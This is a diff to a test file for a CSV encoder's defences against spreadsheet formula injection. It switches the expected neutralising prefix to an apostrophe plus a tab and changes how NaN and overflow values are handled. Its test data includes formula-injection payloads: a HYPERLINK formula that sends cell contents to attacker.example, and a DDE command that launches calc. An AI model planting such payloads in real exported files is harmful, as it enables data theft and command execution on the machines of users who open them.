@@ -3,7 +3,7 @@ import { test } from "node:test";
 import { csvDecimal, csvIsoDate, encodeCsv, encodeCsvCell } from "../src/utils/csv.ts";
 import { parseCsv, values } from "./fixtures/rfc4180.mjs";
 
-const BOM = "﻿";
+const BOM = "\uFEFF";
 const header = ["Text", "Number"];
 function roundTrip(records) {
   const document = encodeCsv(header, records);
@@ -22,7 +22,7 @@ const awkward = [
   "bare\rCR",
   "trailing\r\n",
   "  leading and trailing spaces  ",
-  "café 日本語 مرحبا \u{1F600} é",
+  "café 日本語 مرحبا \u{1F600} e\u0301",
   "a=b",
   "1-2",
   "email@example.test",
@@ -49,13 +49,13 @@ const formulas = [
   "\r=1+1",
   "\n=1+1",
   "\tplain tab",
-  "＝1+1",
-  "＋1",
-  "－1",
-  "＠SUM(A1)",
+  "\uFF1D1+1",
+  "\uFF0B1",
+  "\uFF0D1",
+  "\uFF20SUM(A1)",
   " =1+1",
-  " =1+1",
-  "​=1+1",
+  "\u00a0=1+1",
+  "\u200b=1+1",
   "\u0001=1+1",
   '=HYPERLINK("http://attacker.example/?d="&A1,"Open")',
   "=cmd|' /C calc'!A0",
@@ -64,12 +64,13 @@ const formulas = [
   "-5",
 ];
 
-test("formula-leading text is neutralised with an apostrophe and otherwise preserved", () => {
+test("formula-leading text is neutralised with an apostrophe and a tab and otherwise preserved", () => {
   const records = roundTrip(formulas.map((text) => [text, null]));
-  assert.deepEqual(values(records).slice(1), formulas.map((text) => [`'${text}`, ""]));
-  // OWASP examples, byte for byte.
-  assert.equal(encodeCsvCell('=1+2";=1+2'), '"\'=1+2"";=1+2"');
-  assert.equal(encodeCsvCell("=1+2'\" ;,=1+2"), '"\'=1+2\'"" ;,=1+2"');
+  assert.deepEqual(values(records).slice(1), formulas.map((text) => [`'\t${text}`, ""]));
+  // OWASP's examples: quoted, quotes doubled, apostrophe marker, plus the tab
+  // OWASP recommends for Excel-resistant output.
+  assert.equal(encodeCsvCell('=1+2";=1+2'), '"\'\t=1+2"";=1+2"');
+  assert.equal(encodeCsvCell("=1+2'\" ;,=1+2"), '"\'\t=1+2\'"" ;,=1+2"');
 });
 
 test("numeric cells stay bare numbers, including negative values", () => {
@@ -79,11 +80,11 @@ test("numeric cells stay bare numbers, including negative values", () => {
     ["rounded", csvDecimal(0.1 + 0.2)],
     ["zero", csvDecimal(0)],
     ["empty", null],
+    ["overflow", csvDecimal(1e308 * 24)],
+    ["not a number", csvDecimal(Number.NaN)],
   ]);
-  assert.deepEqual(values(records).slice(1).map(([, number]) => number), ["-5.00", "1.50", "0.30", "0.00", ""]);
+  assert.deepEqual(values(records).slice(1).map(([, number]) => number), ["-5.00", "1.50", "0.30", "0.00", "", "", ""]);
   assert(records.slice(1).every(([, number]) => !number.quoted));
-  assert.throws(() => csvDecimal(Number.NaN), RangeError);
-  assert.throws(() => csvDecimal(Number.POSITIVE_INFINITY), RangeError);
 });
 
 test("ISO dates are bare; anything else in a date column is encoded as text", () => {
@@ -92,7 +93,7 @@ test("ISO dates are bare; anything else in a date column is encoded as text", ()
     ["legacy", csvIsoDate("=1+1")],
     ["loose", csvIsoDate("2026-4-1")],
   ]);
-  assert.deepEqual(values(records).slice(1).map(([, date]) => date), ["2026-04-01", "'=1+1", "2026-4-1"]);
+  assert.deepEqual(values(records).slice(1).map(([, date]) => date), ["2026-04-01", "'\t=1+1", "2026-4-1"]);
   assert.deepEqual(records.slice(1).map(([, date]) => date.quoted), [false, true, true]);
 });
 
